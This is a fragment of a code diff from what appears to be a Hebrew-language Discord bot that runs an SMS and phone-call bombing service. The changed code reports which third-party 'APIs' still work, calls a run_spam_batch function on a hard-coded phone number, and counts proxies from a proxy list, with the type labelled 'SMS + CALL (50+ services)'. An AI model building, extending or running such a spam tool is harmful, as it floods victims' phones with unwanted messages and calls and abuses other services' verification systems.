-    embed.add_field(name="❌ נכשלו", value=f"{len(failed)}/{len(results)}", inline=True)
+    embed.add_field(name="✅ עובדים", value=f"{len(working)}/{len(tests)}", inline=True)
+    embed.add_field(name="❌ נכשלו", value=f"{len(failed)}/{len(tests)}", inline=True)
     
     if working:
-        working_list = "\n".join([f"✅ {r['name']}" for r in working[:15]])
-        embed.add_field(name="📡 APIs שעובדים", value=working_list if working_list else "אין", inline=False)
+        embed.add_field(name="📡 APIs שעובדים", value="\n".join(working[:15]) if working else "אין", inline=False)
     
     if failed:
-        failed_list = "\n".join([f"❌ {r['name']}" for r in failed[:15]])
-        embed.add_field(name="⚠️ APIs שנכשלו", value=failed_list if failed_list else "אין", inline=False)
+        embed.add_field(name="⚠️ APIs שנכשלו", value="\n".join(failed[:15]) if failed else "אין", inline=False)
     
     await interaction.edit_original_response(embed=embed)
 
@@ -929,7 +1017,7 @@ async def cmd_checkstatus(interaction: discord.Interaction):
     success = await run_spam_batch("0506500708")
     embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
     embed.add_field(name="✅ בקשות", value=str(success), inline=True)
-    embed.add_field(name="🔥 פרוקסי", value="18", inline=True)
+    embed.add_field(name="🔥 פרוקסי", value=str(len(PROXY_LIST)), inline=True)
     embed.add_field(name="📞 סוג", value="SMS + CALL (50+ שירותים)", inline=True)
     await interaction.followup.send(embed=embed, ephemeral=True)
 
